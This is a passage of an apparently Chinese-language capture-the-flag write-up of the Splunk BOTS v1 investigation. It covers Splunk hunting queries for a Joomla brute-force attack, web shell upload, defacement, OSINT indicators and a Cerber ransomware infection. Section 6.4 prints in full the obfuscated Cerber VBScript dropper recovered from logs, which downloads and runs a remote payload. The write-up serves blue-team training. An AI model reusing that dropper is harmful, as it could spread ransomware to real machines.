<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">index&#x3D;botsv1 sourcetype&#x3D;stream:http form_data&#x3D;*username*passwd* | rex field&#x3D;form_data &quot;passwd&#x3D;(?&lt;p&gt;\w+)&quot; </span><br><span class="line">| search p&#x3D;&quot;batman&quot; </span><br><span class="line">| transaction p</span><br><span class="line">| eval dur&#x3D;round(duration,2)</span><br><span class="line">| table dur</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>dur</th>
</tr>
</thead>
<tbody><tr>
<td>92.17</td>
</tr>
</tbody></table>
<h2 id="5-11-How-many-unique-passwords-were-attempted-in-the-brute-force-attempt"><a href="#5-11-How-many-unique-passwords-were-attempted-in-the-brute-force-attempt" class="headerlink" title="5.11 How many unique passwords were attempted in the brute force attempt?"></a>5.11 How many unique passwords were attempted in the brute force attempt?</h2><p>蛮力尝试中尝试了多少个不同的密码？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">index&#x3D;botsv1 imreallynotbatman.com sourcetype&#x3D;stream:http http_method&#x3D;&quot;POST&quot; form_data&#x3D;*username*passwd* </span><br><span class="line">| rex field&#x3D;form_data &quot;passwd&#x3D;(?&lt;p&gt;\w+)&quot; </span><br><span class="line">| dedup p </span><br><span class="line">| stats count</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>count</th>
</tr>
</thead>
<tbody><tr>
<td>412</td>
</tr>
</tbody></table>
<h2 id="5-12-What-is-the-name-of-the-executable-uploaded-by-P01s0n1vy"><a href="#5-12-What-is-the-name-of-the-executable-uploaded-by-P01s0n1vy" class="headerlink" title="5.12 What is the name of the executable uploaded by P01s0n1vy?"></a>5.12 What is the name of the executable uploaded by P01s0n1vy?</h2><p>P01s0n1vy上传的可执行文件的名称是什么？</p>
<p>首先过滤出上传请求格式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index&#x3D;botsv1 sourcetype&#x3D;stream:http dest&#x3D;&quot;192.168.250.70&quot; &quot;multipart&#x2F;form-data&quot; </span><br><span class="line">| head 1</span><br></pre></td></tr></table></figure>

<p>得到：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">part_filename&quot;:[&quot;3791.exe&quot;,&quot;agent.php&quot;]</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p> 然后使用这个条件进行搜索：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index&#x3D;botsv1 sourcetype&#x3D;stream:http dest&#x3D;&quot;192.168.250.70&quot; &quot;multipart&#x2F;form-data&quot; </span><br><span class="line">|  stats count by part_filename&#123;&#125;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>part_filename{}</th>
<th>count</th>
</tr>
</thead>
<tbody><tr>
<td>3791.exe</td>
<td>1</td>
</tr>
<tr>
<td>agent.php</td>
<td>1</td>
</tr>
</tbody></table>
<h2 id="5-13-What-is-the-MD5-hash-of-the-executable-uploaded"><a href="#5-13-What-is-the-MD5-hash-of-the-executable-uploaded" class="headerlink" title="5.13 What is the MD5 hash of the executable uploaded?"></a>5.13 What is the MD5 hash of the executable uploaded?</h2><p>上传的可执行文件的md5 hash。</p>
<p>首先搜索确认sourcetype：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index&#x3D;botsv1 3791.exe md5 | stats count by sourcetype</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>sourcetype</th>
<th>count</th>
</tr>
</thead>
<tbody><tr>
<td>XmlWinEventLog:Microsoft-Windows-Sysmon/Operational</td>
<td>67</td>
</tr>
</tbody></table>
<p>然后条件搜索：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">index&#x3D;botsv1 3791.exe sourcetype&#x3D;&quot;XmlWinEventLog:Microsoft-Windows-Sysmon&#x2F;Operational&quot; CommandLine&#x3D;&quot;3791.exe&quot;</span><br><span class="line">| rex field&#x3D;_raw MD5&#x3D;&quot;(?&lt;md5sum&gt;\w+)&quot; </span><br><span class="line">| table md5sum</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>md5sum</th>
</tr>
</thead>
<tbody><tr>
<td>AAE3F5A29935E6ABCC2C2754D12A9AF0</td>
</tr>
</tbody></table>
<h2 id="5-14-What-is-the-name-of-the-file-that-defaced-the-imreallynotbatman-com-website"><a href="#5-14-What-is-the-name-of-the-file-that-defaced-the-imreallynotbatman-com-website" class="headerlink" title="5.14 What is the name of the file that defaced the imreallynotbatman.com website?"></a>5.14 What is the name of the file that defaced the imreallynotbatman.com website?</h2><p>破坏了imreallynotbatman.com网站的文件的名称是什么？</p>
<p>这里是攻击者利用漏洞把自己的文件下载到了我们的server，所以攻击者的ip是dest：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">index&#x3D;botsv1 sourcetype&#x3D;&quot;suricata&quot; src_ip&#x3D;&quot;192.168.250.70&quot; dest_ip&#x3D;&quot;23.22.63.114&quot; </span><br><span class="line">|  stats count by http.http_method, http.hostname, http.url </span><br><span class="line">|  sort -count</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>http.http_method</th>
<th>http.hostname</th>
<th>http.url</th>
<th>count</th>
</tr>
</thead>
<tbody><tr>
<td>GET</td>
<td>imreallynotbatman.com</td>
<td>/joomla/administrator/index.php</td>
<td>824</td>
</tr>
<tr>
<td>POST</td>
<td>imreallynotbatman.com</td>
<td>/joomla/administrator/index.php</td>
<td>411</td>
</tr>
<tr>
<td>GET</td>
<td>71.39.18.126</td>
<td>/joomla/agent.php</td>
<td>52</td>
</tr>
<tr>
<td>GET</td>
<td>prankglassinebracket.jumpingcrab.com</td>
<td>/poisonivy-is-coming-for-you-batman.jpeg</td>
<td>3</td>
</tr>
</tbody></table>
<p>Answer: <code>poisonivy-is-coming-for-you-batman.jpeg</code></p>
<h2 id="5-15-This-attack-used-dynamic-DNS-to-resolve-to-the-malicious-IP-What-fully-qualified-domain-name-FQDN-is-associated-with-this-attack"><a href="#5-15-This-attack-used-dynamic-DNS-to-resolve-to-the-malicious-IP-What-fully-qualified-domain-name-FQDN-is-associated-with-this-attack" class="headerlink" title="5.15  This attack used dynamic DNS to resolve to the malicious IP. What fully qualified domain name (FQDN) is associated with this attack?"></a>5.15  This attack used dynamic DNS to resolve to the malicious IP. What fully qualified domain name (FQDN) is associated with this attack?</h2><p>该攻击使用动态DNS解析为恶意IP。 与此攻击相关的是什么完全限定域名（FQDN）？</p>
<p>前面的查询已经得到了结果 ： <code>prankglassinebracket.jumpingcrab.com</code></p>
<h2 id="5-16-What-IP-address-has-P01s0n1vy-tied-to-domains-that-are-pre-staged-to-attack-Wayne-Enterprises"><a href="#5-16-What-IP-address-has-P01s0n1vy-tied-to-domains-that-are-pre-staged-to-attack-Wayne-Enterprises" class="headerlink" title="5.16  What IP address has P01s0n1vy tied to domains that are pre-staged to attack Wayne Enterprises?"></a>5.16  What IP address has P01s0n1vy tied to domains that are pre-staged to attack Wayne Enterprises?</h2><p>P01s0n1vy已将哪些IP地址绑定到已预先准备好攻击Wayne Enterprises的域？</p>
<p>Answer: <code>23.22.63.114</code></p>
<h2 id="5-17-Based-on-the-data-gathered-from-this-attack-and-common-open-source-intelligence-sources-for-domain-names-what-is-the-email-address-that-is-most-likely-associated-with-P01s0n1vy-APT-group"><a href="#5-17-Based-on-the-data-gathered-from-this-attack-and-common-open-source-intelligence-sources-for-domain-names-what-is-the-email-address-that-is-most-likely-associated-with-P01s0n1vy-APT-group" class="headerlink" title="5.17 Based on the data gathered from this attack and common open source intelligence sources for domain names, what is the email address that is most likely associated with P01s0n1vy APT group?"></a>5.17 Based on the data gathered from this attack and common open source intelligence sources for domain names, what is the email address that is most likely associated with P01s0n1vy APT group?</h2><p>根据从此次攻击和通用的开源域名情报来源收集的数据，最可能与P01s0n1vy APT组相关联的电子邮件地址是什么？</p>
<p>在线的IOC查询</p>
<p><a href="https://threatcrowd.org/ip.php?ip=23.22.63.114" target="_blank" rel="noopener">https://threatcrowd.org/ip.php?ip=23.22.63.114</a></p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020072801.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>Answer: <code>lillian.rose@po1s0n1vy.com</code></p>
<h2 id="5-18-GCPD-reported-that-common-TTPs-Tactics-Techniques-Procedures-for-the-P01s0n1vy-APT-group-if-initial-compromise-fails-is-to-send-a-spear-phishing-email-with-custom-malware-attached-to-their-intended-target-This-malware-is-usually-connected-to-P01s0n1vy’s-initial-attack-infrastructure-Using-research-techniques-provide-the-SHA256-hash-of-this-malware"><a href="#5-18-GCPD-reported-that-common-TTPs-Tactics-Techniques-Procedures-for-the-P01s0n1vy-APT-group-if-initial-compromise-fails-is-to-send-a-spear-phishing-email-with-custom-malware-attached-to-their-intended-target-This-malware-is-usually-connected-to-P01s0n1vy’s-initial-attack-infrastructure-Using-research-techniques-provide-the-SHA256-hash-of-this-malware" class="headerlink" title="5.18  GCPD reported that common TTPs (Tactics, Techniques, Procedures) for the P01s0n1vy APT group if initial compromise fails is to send a spear phishing email with custom malware attached to their intended target. This malware is usually connected to P01s0n1vy’s initial attack infrastructure. Using research techniques, provide the SHA256 hash of this malware."></a>5.18  GCPD reported that common TTPs (Tactics, Techniques, Procedures) for the P01s0n1vy APT group if initial compromise fails is to send a spear phishing email with custom malware attached to their intended target. This malware is usually connected to P01s0n1vy’s initial attack infrastructure. Using research techniques, provide the SHA256 hash of this malware.</h2><p>GCPD报告说，如果最初的攻击失败，则P01s0n1vy APT组的常见TTP（战术，技术，规程）是发送带有自定义恶意软件的鱼叉式网络钓鱼电子邮件，并附有其预定目标。 该恶意软件通常连接到P01s0n1vy的初始攻击基础结构。 使用研究技术，提供此恶意软件的SHA256哈希。</p>
<p><a href="https://www.threatminer.org/host.php?q=23.22.63.114" target="_blank" rel="noopener">https://www.threatminer.org/host.php?q=23.22.63.114</a></p>
<p>这里有一些相关文件hash，其中<a href="https://www.threatminer.org/sample.php?q=c99131e0169171935c5ac32615ed6261" target="_blank" rel="noopener">c99131e0169171935c5ac32615ed6261</a>被检测为malicious，这个文件详情里<a href="https://www.threatminer.org/sample.php?q=c99131e0169171935c5ac32615ed6261有sha256" target="_blank" rel="noopener">https://www.threatminer.org/sample.php?q=c99131e0169171935c5ac32615ed6261有sha256</a>:</p>
<p><code>9709473ab351387aab9e816eff3910b9f28a7a70202e250ed46dba8f820f34a8</code></p>
<h2 id="5-19-What-special-hex-code-is-associated-with-the-customized-malware-discussed-in-the-previous-question"><a href="#5-19-What-special-hex-code-is-associated-with-the-customized-malware-discussed-in-the-previous-question" class="headerlink" title="5.19 What special hex code is associated with the customized malware discussed in the previous question?"></a>5.19 What special hex code is associated with the customized malware discussed in the previous question?</h2><p>上一个问题中讨论的定制恶意软件有哪些特殊的十六进制代码？</p>
<p> VT中有相关资料：</p>
<p><a href="https://www.virustotal.com/gui/file/9709473ab351387aab9e816eff3910b9f28a7a70202e250ed46dba8f820f34a8/community" target="_blank" rel="noopener">https://www.virustotal.com/gui/file/9709473ab351387aab9e816eff3910b9f28a7a70202e250ed46dba8f820f34a8/community</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">53 74 65 76 65 20 42 72 61 6e 74 27 73 20 42 65 61 72 64 20 69 73 20 61 20 70 6f 77 65 72 66 75 6c 20 74 68 69 6e 67 2e 20 46 69 6e 64 20 74 68 69 73 20 6d 65 73 73 61 67 65 20 61 6e 64 20 61 73 6b 20 68 69 6d 20 74 6f 20 62 75 79 20 79 6f 75 20 61 20 62 65 65 72 21 21 21</span><br></pre></td></tr></table></figure>

<h2 id="5-20-What-does-this-hex-code-decode-to"><a href="#5-20-What-does-this-hex-code-decode-to" class="headerlink" title="5.20 What does this hex code decode to?"></a>5.20 What does this hex code decode to?</h2><p>此十六进制代码将解码为什么？</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"53 74 65 76 65 20 42 72 61 6e 74 27 73 20 42 65 61 72 64 20 69 73 20 61 20 70 6f 77 65 72 66 75 6c 20 74 68 69 6e 67 2e 20 46 69 6e 64 20 74 68 69 73 20 6d 65 73 73 61 67 65 20 61 6e 64 20 61 73 6b 20 68 69 6d 20 74 6f 20 62 75 79 20 79 6f 75 20 61 20 62 65 65 72 21 21 21"</span> | xxd -r -p</span></span><br><span class="line">Steve Brant's Beard is a powerful thing. Find this message and ask him to buy you a beer!!!</span><br></pre></td></tr></table></figure>

<h1 id="6-Ransomware"><a href="#6-Ransomware" class="headerlink" title="6. Ransomware"></a>6. Ransomware</h1><p>这部分是分析勒索病毒的</p>
<h2 id="6-1-What-was-the-most-likely-IP-address-of-we8105desk-on-24AUG2016"><a href="#6-1-What-was-the-most-likely-IP-address-of-we8105desk-on-24AUG2016" class="headerlink" title="6.1 What was the most likely IP address of we8105desk on 24AUG2016?"></a>6.1 What was the most likely IP address of we8105desk on 24AUG2016?</h2><p>在2016年8月24日，we8105desk最可能的IP地址是什么？</p>
<p>时间过滤器设置为08/24/2016，搜索语句过滤。</p>
<p>首先查看sourcetype：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">index&#x3D;botsv1 we8105desk </span><br><span class="line">| stats count by sourcetype</span><br><span class="line">| sort -count</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>sourcetype</th>
<th>count</th>
</tr>
</thead>
<tbody><tr>
<td>XmlWinEventLog:Microsoft-Windows-Sysmon/Operational</td>
<td>104360</td>
</tr>
<tr>
<td>wineventlog</td>
<td>10028</td>
</tr>
<tr>
<td>stream:smb</td>
<td>1528</td>
</tr>
<tr>
<td>stream:ldap</td>
<td>48</td>
</tr>
<tr>
<td>nessus:scan</td>
<td>24</td>
</tr>
<tr>
<td>WinRegistry</td>
<td>3</td>
</tr>
</tbody></table>
<p>然后就是统计IP：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">index&#x3D;botsv1 we8105desk  sourcetype&#x3D;&quot;XmlWinEventLog:Microsoft-Windows-Sysmon&#x2F;Operational&quot;</span><br><span class="line">| stats count by src_ip</span><br><span class="line">| sort-count</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>src_ip</th>
<th>count</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.250.100</td>
<td>52270</td>
</tr>
<tr>
<td>192.168.250.255</td>
<td>69</td>
</tr>
<tr>
<td>127.0.0.1</td>
<td>66</td>
</tr>
<tr>
<td>0.0.0.0</td>
<td>42</td>
</tr>
<tr>
<td>224.0.0.252</td>
<td>6</td>
</tr>
<tr>
<td>192.168.250.70</td>
<td>1</td>
</tr>
</tbody></table>
<p>答案很明显，192.168.250.100</p>
<h2 id="6-2-What-is-the-name-of-the-USB-key-inserted-by-Bob-Smith"><a href="#6-2-What-is-the-name-of-the-USB-key-inserted-by-Bob-Smith" class="headerlink" title="6.2 What is the name of the USB key inserted by Bob Smith?"></a>6.2 What is the name of the USB key inserted by Bob Smith?</h2><p>Bob Smith插入的USB key的名称是什么？</p>
<p>USB key这个是注册表中有信息，根据文档</p>
<p><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/usbcon/usb-device-specific-registry-settings" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows-hardware/drivers/usbcon/usb-device-specific-registry-settings</a></p>
<p>是在HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USB里面的FriendlyName</p>
<p>直接搜索：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index&#x3D;botsv1 sourcetype&#x3D;WinRegistry friendlyname </span><br><span class="line">| stats count by registry_value_data</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>registry_value_data</th>
<th>count</th>
</tr>
</thead>
<tbody><tr>
<td>MIRANDA_PRI</td>
<td>2</td>
</tr>
</tbody></table>
<h2 id="6-3-After-the-USB-insertion-a-file-execution-occurs-that-is-the-initial-Cerber-infection-This-file-execution-creates-two-additional-processes-What-is-the-name-of-the-file"><a href="#6-3-After-the-USB-insertion-a-file-execution-occurs-that-is-the-initial-Cerber-infection-This-file-execution-creates-two-additional-processes-What-is-the-name-of-the-file" class="headerlink" title="6.3 After the USB insertion, a file execution occurs that is the initial Cerber infection. This file execution creates two additional processes. What is the name of the file?"></a>6.3 After the USB insertion, a file execution occurs that is the initial Cerber infection. This file execution creates two additional processes. What is the name of the file?</h2><p>USB插入后，运行了一个可执行文件，这是最初的Cerber 感染。该文件执行创建了两个附加进程，这个文件的名字是什么？</p>
<p>首先我们确认插入的USB的盘符：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">index&#x3D;botsv1 we8105desk sourcetype&#x3D;XmlWinEventLog:Microsoft-Windows-Sysmon&#x2F;Operational </span><br><span class="line">| makemv delim&#x3D;&quot;:&quot; CurrentDirectory | eval drive&#x3D;mvindex(CurrentDirectory,0) </span><br><span class="line">| stats count by drive</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>drive</th>
<th>count</th>
</tr>
</thead>
<tbody><tr>
<td>C</td>
<td>298</td>
</tr>
<tr>
<td>D</td>
<td>7</td>
</tr>
</tbody></table>
<p>插入的USB是D盘，然后就直接提取执行D盘相关文件的日志：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">index&#x3D;botsv1 host&#x3D;&quot;we8105desk&quot; sourcetype&#x3D;&quot;XmlWinEventLog:Microsoft-Windows-Sysmon&#x2F;Operational&quot; CommandLine&#x3D;&quot;*D:\\*&quot; </span><br><span class="line">| table _time, CommandLine </span><br><span class="line">| reverse</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>_time</th>
<th>CommandLine</th>
</tr>
</thead>
<tbody><tr>
<td>2016/08/24 16:43:12</td>
<td>“C:\Program Files (x86)\Microsoft Office\Office14\WINWORD.EXE” /n /f “D:\Miranda_Tate_unveiled.dotm”</td>
</tr>
<tr>
<td>2016/08/24 16:56:47</td>
<td>“C:\Windows\system32\rundll32.exe” C:\Windows\system32\shell32.dll,OpenAs_RunDLL D:\Work Stuff\013\013366.pdf</td>
</tr>
</tbody></table>
<p>答案是Miranda_Tate_unveiled.dotm</p>
<h2 id="6-4-During-the-initial-Cerber-infection-a-VB-script-is-run-The-entire-script-from-this-execution-pre-pended-by-the-name-of-the-launching-exe-can-be-found-in-a-field-in-Splunk-What-is-the-length-in-characters-of-this-field"><a href="#6-4-During-the-initial-Cerber-infection-a-VB-script-is-run-The-entire-script-from-this-execution-pre-pended-by-the-name-of-the-launching-exe-can-be-found-in-a-field-in-Splunk-What-is-the-length-in-characters-of-this-field" class="headerlink" title="6.4 During the initial Cerber infection a VB script is run. The entire script from this execution, pre-pended by the name of the launching .exe, can be found in a field in Splunk. What is the length in characters of this field?"></a>6.4 During the initial Cerber infection a VB script is run. The entire script from this execution, pre-pended by the name of the launching .exe, can be found in a field in Splunk. What is the length in characters of this field?</h2><p>在最初的Cerber感染期间，将运行VB脚本。 可以在Splunk中的一个字段中找到此执行的整个脚本，该脚本之前带有启动.exe的名称。 该字段的字符长度是多少？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">index&#x3D;botsv1 host&#x3D;&quot;we8105desk&quot; sourcetype&#x3D;&quot;XmlWinEventLog:Microsoft-Windows-Sysmon&#x2F;Operational&quot; (CommandLine&#x3D;&quot;*D:\\*&quot; OR ParentCommandLine&#x3D;&quot;*D:\\*&quot;) </span><br><span class="line">| eval length&#x3D;len(CommandLine) </span><br><span class="line">| table CommandLine, length</span><br><span class="line">| sort by -length</span><br><span class="line">| head 1</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>CommandLine</th>
<th>length</th>
</tr>
</thead>
<tbody><tr>
<td>cmd.exe /V /C set “GSI=%APPDATA%%RANDOM%.vbs” &amp;&amp; (for %i in (“DIm RWRL” “FuNCtioN GNbiPp(Pt5SZ1)” “EYnt=45” “GNbiPp=AsC(Pt5SZ1)” “Xn1=52” “eNd fuNCtiON” “SUb OjrYyD9()” “J0Nepq=56” “Dim UJv,G4coQ” “LT=23” “dO WHiLE UJv&lt;&gt;3016-3015” “G4coQ=G4coQ+1” “WSCRiPt.sLEeP(11)” “LoOP” “UsZK0=85” “ENd suB” “fuNctIon J7(BLI4A3)” “K5AU=29” “J7=cHR(BLI4A3)” “XBNutM9=36” “eNd fuNCtiON” “SUb MA(QrG)” “WXCzRz=9” “Dim Jw” “Qt7=34” “Jw=TIMeR+QrG” “Do WhiLE tIMEr&lt;Jw” “WSCRipT.sleEP(6)” “LOOp” “EXdkRkH=78” “enD sUB” “fUnCTion M1p67jL(BwqIM7,Qa)” “Yi=80” “dIM KH,ChnFY,RX,Pg,C6YT(8)” “Cm=7” “C6YT(1)=107” “Rzf=58” “C6YT(5)=115” “BSKoW=10” “C6YT(4)=56” “Cwd6=35” “C6YT(7)=110” “AQ=98” “C6YT(6)=100” “Y6Cm1I=82” “C6YT(2)=103” “JH3F2i=74” “C6YT(8)=119” “JRvsG2s=76” “C6YT(3)=53” “Yh=31” “C6YT(0)=115” “GuvD=47” “Tbvf1=67” “SeT KH=cReATeObject(A9y(“3C3A1D301F2D063708772930033C3C201C2D0A34203B053C0C2D”, “Yo”))” “V2JR=73” “Set ChnFY=KH.GETfilE(BwqIM7)” “RGeJ=68” “SeT Pg=ChnFY.opEnASTExTstReAM(6806-6805,7273-7273)” “CtxOk=82” “seT RX=KH.cREateteXtFiLe(Qa,6566-6565,2508-2508)” “XPL9af=76” “Do uNtil Pg.aTEnDOfStReam” “RX.wRitE J7(OyVNo(GNbiPp(Pg.rEAD(6633-6632)),C6YT(0)))” “LooP” “IQz=49” “RX.cloSe” “CBR1gC7=51” “Pg.cLOSE” “PmG=64” “eNd funCTIOn” “FUNcTION Ql9zEF()” “IBL2=16” “Ql9zEF=secoND(Time)” “MUTkPNJ=41” “End FUNcTiOn” “FUnCtion A9y(Am,T1GCbB)” “CWCH9r=82” “Dim V3sl0m,F4ra,AxFE” “RLLp8R=89” “For V3sl0m=1 To (lEn(Am)/2)” “F4ra=(J7((8270-8232)) &amp; J7((5328/74))&amp;(miD(Am,(V3sl0m+V3sl0m)-1,2)))” “AxFE=(GNbiPp(mID(T1GCbB,((V3sl0m MOd Len(T1GCbB))+1),1)))” “A9y=A9y+J7(OyVNo(F4ra,AxFE))” “NeXT” “DxZ40=89” “enD fUNction” “Sub AylniN()” “N6nzb=92” “DIm GWJCk,Q3y,GKasG0” “FDu=47” “GWJCk=93961822” “UZ=32” “FoR Q3y=1 To GWJCk” “GKasG0=GKasG0+1” “neXt” “B1jq2Hk=63” “If GKasG0=GWJCk tHen” “KXso=18” “MA((-176+446))” “IP4=48” “Yq(A9y(“0B3B1D44626E7E1020055D3C20230A3B0C503D31230C3700593135344D201B53772C39173D475E2826”,”QcOi4XA”))” “YTsWy=31” “elSe” “DO5gpmA=84” “A8=86” “EnD iF” “XyUP=64” “eND SuB” “sUB GKfD3aY(FaddNPJ)” “SDU0BLq=57” “DiM UPhqZ,KbcT” “DxejPK=88” “KbcT=”Drn4AW”” “GROlc7=82” “sET UPhqZ=CREAteOBJecT(A9y(“332A7B05156A211A46243629”,KbcT))” “Gs0g=3” “UPhqZ.OpEn” “TF1=68” “UPhqZ.tyPE=6867-6866” “RDjmY=24” “UPhqZ.wrITe FaddNPJ” “WiFgvS=78” “UPhqZ.SaVeTOfIle RWRL,8725-8723” “AF=4” “UPhqZ.closE” “JC7sf2=1” “Cke4e” “JM=88” “EnD suB” “fuNCtIoN Yq(PDqi1)” “I0=22” “DiM YTwwO,BAU7Cz,Uv,JiYwVG,IK” “GJDnbE=32” “On ErrOR reSume NeXT” “B7bT=1” “Uv=”Tk”” “ELw=73” “sEt YTwwO=CREaTeObjeCT(A9y(“3C07082602241F7A383C0E3807”,Uv))” “K4=62” “GAiF” “IS1cj=19” “Set Dzc0=YTwwO.eNVIrONMEnt(A9y(“013B183400023A”,”EQiWw”))” “D9S=38” “RWRL=Dzc0(A9y(“14630811720C14”,”XU3”))&amp;J7((8002-7910))&amp; Ql9zEF &amp; Ql9zEF” “AtCQ=95” “JiYwVG=”FcQqQ”” “Tf=79” “sEt BAU7Cz=CrEATEoBjECT(A9y(“2E38122329103E1725683B1C3D19123701”,JiYwVG))” “QUY=56” “BAU7Cz.OpeN A9y(“0D0E1E”,”KJ”),PDqi1,7387-7387” “JX2=58” “BAU7Cz.SeTReQuEstHeAdeR A9y(“1F59242828”,”OM8J”),A9y(“0D354C3D356B567A0F6B6B”,”VoL8XF”)” “URkT=71” “BAU7Cz.SEnD()” “QdFeA6=65” “if BAU7Cz.StaTUstExt=A9y(“652840353A542512023C5B3D572F27”,”S5I2A”) then” “PwTLW23=36” “GAiF” “R4xYBS=63” “MA(4)” “PjL6m=46” “GKfD3aY BAU7Cz.ReSpONSEbody” “Fj98=72” “Else” “D7T=91” “IK=”NNXFD0”” “NK=74” “SeT BAU7Cz= CreATeobJECT(A9y(“033125365F3D213E326A68030210121060”,IK))” “QJ=35” “BAU7Cz.oPeN A9y(“2A2F0E”,”TmjZ8d”),A9y(“07351B31556E40785D6F5D735D6F5E715B6F5E795D6E02291B33412B1F26”,”Ao” ),5022-5022” “UMp8=85” “BAU7Cz.SeTReqUesTheadER A9y(“1439190A24”,”AFXwm”),A9y(“371038301A716C5F7B6644”,”LUi”)” “NluUc=93” “BAU7Cz.SENd()” “EOtR=44” “If BAU7Cz.STaTUSTexT=A9y(“03510A3B3A51146F105F163B365E0C”,”OS0x”) THen GKfD3aY BAU7Cz.REsPOnSeBODY” “Q6sMEZ=54” “I9Nl7=56” “end if” “Dq=54” “eND FuNCTioN” “fUNctIon OyVNo(U1,Brt0d)” “SNOW=59” “OyVNo=(U1 ANd noT Brt0d)oR(NOt U1 And Brt0d)” “QTi5K=54” “enD funcTION” “Sub Cke4e()” “WTOyAw=62” “dIM EuM,WIbud,NCiN,Fs8HJ” “A5AT=92” “NCiN=””””” “SX6=93” “WIbud=RWRL &amp; Ql9zEF &amp; A9y(“4A330F3F”,”WdGbOGp”)” “V5B7Zh=92” “M1p67jL RWRL,WIbud” “L13=45” “iF Fs8HJ=”” tHen MA(4)” “CHaK=38” “EuM=”Iqxkf”” “U56m=67” “SEt VP=creATeoBJEcT(A9y(“262B081420010C453521141407”,EuM))” “U5Quw=85” “VP.Run A9y(“1023287B163629755C0D6C06270F1E01536C6E7551”,”UsNL”) &amp; WIbud &amp; NCiN,2912-2912,5755-5755” “A6mfcYL=76” “End sUB” “JoxZ3=43” “AylniN” “suB GAiF()” “G4vzM=95” “Dim DCRml9g, CjoNOY9” “For DCRml9g = 68 To 6000327” “CjoNOY9 = Rvwr + 23 + 35 + 27” “Next” “KK0H=46” “enD sUb”) do @echo %~i)&gt;”!GSI!” &amp;&amp; start “” “!GSI!”</td>
<td>4490</td>
</tr>
</tbody></table>
<p>Answer: <code>4490</code></p>
<h2 id="6-5-Bob-Smith’s-workstation-we8105desk-was-connected-to-a-file-server-during-the-ransomware-outbreak-What-is-the-IP-address-of-the-file-server"><a href="#6-5-Bob-Smith’s-workstation-we8105desk-was-connected-to-a-file-server-during-the-ransomware-outbreak-What-is-the-IP-address-of-the-file-server" class="headerlink" title="6.5 Bob Smith’s workstation (we8105desk) was connected to a file server during the ransomware outbreak. What is the IP address of the file server?"></a>6.5 Bob Smith’s workstation (we8105desk) was connected to a file server during the ransomware outbreak. What is the IP address of the file server?</h2><p>在勒索软件爆发期间，鲍勃·史密斯（Bob Smith）的工作站（we8105desk）已连接到文件服务器。 文件服务器的IP地址是什么？</p>
<p>就是直接过滤fileshare：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index&#x3D;botsv1 host&#x3D;&quot;we8105desk&quot; sourcetype&#x3D;WinRegistry fileshare </span><br><span class="line">| head 1</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>时间</th>
<th>事件</th>
</tr>
</thead>
<tbody><tr>
